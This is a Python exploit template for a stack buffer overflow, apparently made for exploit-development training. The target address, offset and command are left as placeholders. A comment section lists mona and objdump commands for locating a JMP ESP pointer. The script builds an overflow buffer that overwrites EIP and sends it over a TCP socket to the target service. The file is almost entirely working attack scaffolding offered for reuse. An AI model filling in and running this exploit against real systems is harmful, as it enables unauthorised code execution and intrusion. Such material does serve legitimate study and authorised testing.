#!/usr/bin/python

import socket, struct

RHOST = '<ip>'
RPORT = <port>
cmd = '<command>'
offset_srp = <offset>
buf_totlen = <buffer length>
ptr_jmp_esp = 0x ## Use instructions below to find JMP

"""
#############################################################################

Find a usable JMP ESP in either a running or crashed state
	
	!mona jmp -r esp -cpb "\x00"  (ENSURE ALL BAD CHARS GO HERE IN THIS FORMAT, NOT 0x00!!)

    Look at the Log Data page (green) and note the location of the pointer(s)
	
	**************************************************************************************************************
	Sometimes you might have to search for JMP ESP and the specific .dll  you can exclude bad chars in that string.

	!mona find -s "\xff\xe4" -m slmfc.dll -cpb "\x00"

 	/usr/share/framework2/msfelfscan -f ./crossfire -j esp

	objdump -d filenametolookin | grep -i jmp

	objdump -d filenametolookin | grep -i call
	***************************************************************************************************************
	
	Convert Endianness from command line.
	# python
	>>> import struct
	>>> struct.pack("<I", 0x080414C3)   Replace 0x080414C3 with JMP ESP you found.
	'\xc3\x14\x04\x08'
	

#############################################################################
"""


buf = ""
buf += "A" * (offset_srp - len(buf))    # Send the A's up to the EIP
buf += struct.pack("<I", ptr_jmp_esp)   # Making little Indians from the JMP ESP
buf += "\xCC\xCC\xCC\xCC"				# C if we can get C's to the top
buf += "C" * (buf_totlen - len(buf))    # C ya later
buf += "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
s.send(cmd + buf)
s.recv(1024)
s.close()

